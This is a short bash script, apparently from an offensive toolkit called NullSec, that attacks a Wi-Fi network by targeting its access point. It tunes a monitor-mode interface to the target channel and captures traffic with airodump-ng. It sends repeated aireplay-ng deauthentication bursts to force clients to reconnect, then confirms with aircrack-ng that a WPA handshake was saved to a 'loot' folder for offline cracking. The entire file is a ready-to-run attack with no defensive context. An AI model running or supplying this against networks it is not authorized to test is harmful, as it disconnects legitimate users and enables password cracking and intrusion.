#!/bin/bash
# NullSec Handshake Capture Payload
# Captures WPA handshakes for offline cracking

TARGET_BSSID="$1"
TARGET_CHANNEL="$2"
IFACE="${3:-wlan1mon}"
OUTPUT="/root/loot/handshakes"

if [[ -z "$TARGET_BSSID" ]] || [[ -z "$TARGET_CHANNEL" ]]; then
    echo "Usage: $0 <bssid> <channel> [interface]"
    exit 1
fi

mkdir -p "$OUTPUT"

echo "[*] NullSec Handshake Capture"
echo "[*] Target: $TARGET_BSSID"
echo "[*] Channel: $TARGET_CHANNEL"

# Set channel
iwconfig $IFACE channel $TARGET_CHANNEL

# Start capture
echo "[*] Starting capture..."
timeout 60 airodump-ng -c $TARGET_CHANNEL --bssid $TARGET_BSSID \
    -w "$OUTPUT/hs_$(date +%s)" $IFACE &
sleep 5

# Send deauth to force handshake
echo "[*] Sending deauth..."
aireplay-ng -0 5 -a $TARGET_BSSID $IFACE
sleep 10
aireplay-ng -0 5 -a $TARGET_BSSID $IFACE

wait

# Check for handshake
for cap in "$OUTPUT"/*.cap; do
    if aircrack-ng "$cap" 2>&1 | grep -q "1 handshake"; then
        echo "[+] Handshake captured: $cap"
        exit 0
    fi
done

echo "[-] No handshake captured"
